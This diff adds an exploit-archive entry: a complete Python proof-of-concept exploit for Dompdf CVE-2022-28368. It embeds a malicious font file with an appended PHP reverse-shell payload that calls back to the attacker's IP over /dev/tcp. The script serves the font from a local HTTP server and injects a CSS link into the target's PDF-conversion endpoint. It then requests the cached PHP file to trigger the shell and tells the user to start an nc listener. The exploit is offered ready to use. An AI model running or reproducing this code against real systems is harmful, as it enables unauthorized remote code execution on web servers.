@@ -1,0 +1,252 @@
+id: 38504
+date: 04/06/2023
+title: Dompdf 1.2.1 - Remote Code Execution Exploit
+author: Ravindu Wickramasinghe
+cves: CVE-2022-28368
+
+#!/usr/bin/python3
+
+# Exploit Title: Dompdf 1.2.1 - Remote Code Execution (RCE)
+# Date: 16 February 2023
+# Exploit Author: Ravindu Wickramasinghe (@rvizx9)
+# Vendor Homepage: https://dompdf.github.io/
+# Software Link: https://github.com/dompdf/dompdf
+# Version: <1.2.1
+# Tested on: Kali linux
+# CVE : CVE-2022-28368
+# Github Link   : https://github.com/rvizx/CVE-2022-28368
+  
+import subprocess
+import re
+import os
+import sys
+import curses
+import requests
+import base64
+import argparse
+import urllib.parse 
+from urllib.parse import urlparse
+
+def banner():
+    print('''
+
+                \033[2mCVE-2022-28368\033[0m - Dompdf RCE\033[2m PoC Exploit
+                \033[0mRavindu Wickramasinghe\033[2m | rvz  - @rvizx9
+                https://github.com/rvizx/\033[0mCVE-2022-28368
+
+''')
+
+exploit_font = b"AAEAAAAKAO+/vQADACBkdW0xAAAAAAAAAO+/vQAAAAJjbWFwAAwAYAAAAO+/vQAAACxnbHlmNXNj77+9AAAA77+9AAAAFGhlYWQH77+9UTYAAADvv70AAAA2aGhlYQDvv70D77+9AAABKAAAACRobXR4BEQACgAAAUwAAAAIbG9jYQAKAAAAAAFUAAAABm1heHAABAADAAABXAAAACBuYW1lAEQQ77+9AAABfAAAADhkdW0yAAAAAAAAAe+/vQAAAAIAAAAAAAAAAQADAAEAAAAMAAQAIAAAAAQABAABAAAALe+/ve+/vQAAAC3vv73vv73vv73vv70AAQAAAAAAAQAKAAAAOgA4AAIAADMjNTowOAABAAAAAQAAF++/ve+/vRZfDzzvv70ACwBAAAAAAO+/vRU4BgAAAADvv70m270ACgAAADoAOAAAAAYAAQAAAAAAAAABAAAATO+/ve+/vQASBAAACgAKADoAAQAAAAAAAAAAAAAAAAAAAAIEAAAAAEQACgAAAAAACgAAAAEAAAACAAMAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEADYAAwABBAkAAQACAAAAAwABBAkAAgACAAAAAwABBAkAAwACAAAAAwABBAkABAACAAAAcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+
+def get_ip_addresses():
+    output = subprocess.check_output(['ifconfig']).decode()
+    ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+    ip_addresses = re.findall(ip_pattern, output)
+    ip_addresses = [ip for ip in ip_addresses if not ip.startswith('255')]
+    ip_addresses = list(set(ip_addresses))
+    ip_addresses.insert(0, 'localhost')
+    return ip_addresses
+
+def choose_ip_address(stdscr, ip_addresses):
+    curses.curs_set(0)
+    curses.noecho()
+    stdscr.keypad(True)
+    current_row = 0
+    num_rows = len(ip_addresses)
+    stdscr.addstr("[ins]: please select an ip address, use up and down arrow keys, press enter to select.\n\n")
+    while True:
+        stdscr.clear()
+        stdscr.addstr("[ins]: please select an ip address, use up and down arrow keys, press enter to select.\n\n")
+        for i, ip_address in enumerate(ip_addresses):
+            if i == current_row:
+                stdscr.addstr(ip_address, curses.A_REVERSE)
+            else:
+                stdscr.addstr(ip_address)
+            stdscr.addstr("\n")
+        key = stdscr.getch()
+        if key == curses.KEY_UP and current_row > 0:
+            current_row -= 1
+        elif key == curses.KEY_DOWN and current_row < num_rows - 1:
+            current_row += 1
+        elif key == curses.KEY_ENTER or key in [10, 13]:
+            return ip_addresses[current_row]
+
+def help():
+    print('''
+usage: 
+    ./dompdf-rce --inject <css-inject-endpoint> --dompdf <dompdf-instance>  
+
+example:
+    ./dompdf-rce --inject https://vuln.rvz/dev/convert-html-to-pdf?html= --dompdf https://vuln.rvz/dompdf/
+
+notes: 
+    - Provide the parameters in the URL (regardless the request method)
+    - Known Issues!  - Testing with https://github.com/positive-security/dompdf-rce                 
+        The program has been successfully tested for RCE on some systems where dompdf was implemented,
+        But there may be some issues when testing with the dompdf-rce PoC at https://github.com/positive-security/dompdf-rce
+        due to a known issue described at https://github.com/positive-security/dompdf-rce/issues/2. 
+        In this application, the same implementation  was added for now.    
+        Although it may be pointless at the moment, you can still manually add the payload 
+        by copying the exploit_font.php file to ../path-to-dompdf-rce/dompdf/applicaiton/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php    
+    
+    - more : https://www.cve.org/CVERecord?id=CVE-2022-28368
+''')
+
+    sys.exit()
+
+def check_url(url):
+    regex = re.compile(
+        r'^(?:http|ftp)s?://' 
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
+        r'localhost|'  
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
+        r'(?::\d+)?'
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+    if not re.match(regex, url):
+        print(f"\033[91m[err]:\033[0m {url} is not a valid url")
+        return False
+    else:
+        return True
+
+
+def final_param(url):
+    query_start = url.rfind('?')
+    if query_start == -1:
+        query_start = url.rfind('&')
+    if query_start == -1:
+        return None
+    query_string = url[query_start+1:]
+
+    for param in reversed(query_string.split('&')):
+        if '=' in param:
+            name = param.split('=')[0]
+            if name:
+                return name
+    return None
+
+
+if __name__ == '__main__':
+    banner()
+    ports = ['9001', '9002']
+    for port in ports:
+        try:
+            processes = subprocess.check_output(["lsof", "-i", "TCP:9001-9002"]).decode("utf-8")
+            for line in processes.split("\n"):
+                if "LISTEN" in line:
+                    pid = line.split()[1]
+                    port = line.split()[8].split(":")[1]
+                    if port == "9001" or port == "9002":
+                        os.system("kill -9 {}".format(pid))
+            print(f'\033[94m[inf]:\033[0m processes running on port {port} have been terminated')        
+        except:
+            pass
+
+    if len(sys.argv) == 1:
+        print("\033[91m[err]:\033[0m no endpoints were provided. try --help")
+        sys.exit(1)
+
+    elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
+        help()
+
+    elif len(sys.argv) > 1:
+        parser = argparse.ArgumentParser(description='',add_help=False, usage="./dompdf-rce --inject <css-inject-endpoint/file-with-multiple-endpoints> --dompdf <dompdf-instance-endpoint>")
+        parser.add_argument('--inject', type=str, help='[info] provide the url of the css inject endpoint', required=True)
+        parser.add_argument('--dompdf', type=str, help='[info] provide the url of the dompdf instance', required=True)
+        args = parser.parse_args()
+        injectpoint = args.inject
+        dompdf_url = args.dompdf
+
+        if not check_url(injectpoint) and (not check_url(dompdf_url)):
+            sys.exit()   
+
+        param=final_param(injectpoint)
+        if param == None:
+            print("\n\033[91m[err]: no parameters were provided! \033[0mnote: provide the parameters in the url (--inject-css-endpoint url?param=) ")
+            sys.exit()
+
+        ip_addresses = get_ip_addresses()
+        sip = curses.wrapper(choose_ip_address, ip_addresses)
+        print(f'\033[94m[inf]:\033[0m selected ip address: {sip}')
+        
+        shell = '''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'''+sip+'''/9002 0>&1'");?>'''
+        print("\033[94m[inf]:\033[0m using payload: " +shell)
+        
+        print("\033[94m[inf]:\033[0m generating exploit.css and exploit_font.php files...")        
+        decoded_data = base64.b64decode(exploit_font).decode('utf-8')
+        decoded_data += '\n' + shell
+        css = '''
+@font-face {
+    font-family:'exploitfont';
+    src:url('http://'''+sip+''':9001/exploit_font.php');
+    font-weight:'normal';
+    font-style:'normal';
+}
+        '''
+        with open("exploit.css","w") as f:
+                    f.write(css)
+        with open("exploit_font.php","w") as f:
+            f.write(decoded_data)
+        print("\033[94m[inf]:\033[0m starting http server on port 9001..")
+        http_server = subprocess.Popen(['python', '-m', 'http.server', '9001'])
+        url = "http://"+sip+":9001/exploit_font.php"
+        echo_output = subprocess.check_output(['echo', '-n', url.encode()])
+        md5sum_output = subprocess.check_output(['md5sum'], input=echo_output)
+        md5_hash = md5sum_output.split()[0].decode()
+        print("\033[94m[inf]:\033[0m url hash: "+md5_hash)
+        print("\033[94m[inf]:\033[0m filename: exploitfont_normal_"+md5_hash+".php")
+        print("\033[94m[inf]:\033[0m sending the payloads..\n")
+        
+        url = injectpoint
+        if url.endswith("/"):
+            url = url[:-1]
+
+        headers = {
+                'Host': urlparse(injectpoint).hostname,
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Connection': 'close',
+                'Upgrade-Insecure-Requests': '1',
+                'Content-Type': 'application/x-www-form-urlencoded',
+        }
+
+        payload="<link rel=stylesheet href=\'http://"+sip+":9001/exploit.css\'>"
+        data = '{\r\n"'+param+'": "'+payload+'"\r\n}'            
+        try:
+            response1 = requests.get(url+urllib.parse.quote(payload),headers=headers,)
+            response2 = requests.post(url, headers=headers, data=data, verify=False)
+        except:
+            print("\033[91m[err]:\033[0m failed to send the requests! check connection to the host")
+            sys.exit()
+
+        if response1.status_code == 200 or response2.status_code == 200:
+            print("\n\033[92m[inf]: success!\033[0m \n\033[94m[inf]:\033[0m url: "+url+" - status_code: 200")
+        else:
+            print("\n\033[91m[err]: failed to send the exploit.css!\033[0m \n\033[94m[inf]:\033[0m url: "+url+" - status_code: "+str(response1.status_code)+","+str(response2.status_code))
+
+        print("\033[94m[inf]:\033[0m terminating the http server..")
+        http_server.terminate()
+
+        print("\033[93m[ins]:\033[0m start a listener on port 9002 (execute the command on another terminal and press enter)")
+        print("\nnc -lvnp 9002")
+        input("\n\033[93m[ins]:\033[0m press enter to continue!")
+        print("\033[93m[ins]:\033[0m check for connections!")
+        
+        del headers['Content-Type']        
+        url = dompdf_url
+        if url.endswith("/"):
+            url = url[:-1]
+
+        url+="/lib/fonts/exploitfont_normal_"+md5_hash+".php"        
+        response = requests.get(
+            url,
+            headers=headers,
+            verify=False,  )
+         
+        if response.status_code == 200:
+            print("\n\033[92m[inf]: success!\033[0m \n\033[94m[inf]:\033[0m url: "+url+" - status_code: "+str(response.status_code))
+        else:
+            print("\n\033[91m[err]: failed to trigger the payload! \033[0m \n\033[94m[inf]:\033[0m url: "+url+" - status_code: "+str(response.status_code))         
+        print("\033[94m[inf]:\033[0m process complete!")
+
+#  0day.today [2023-04-19]  #
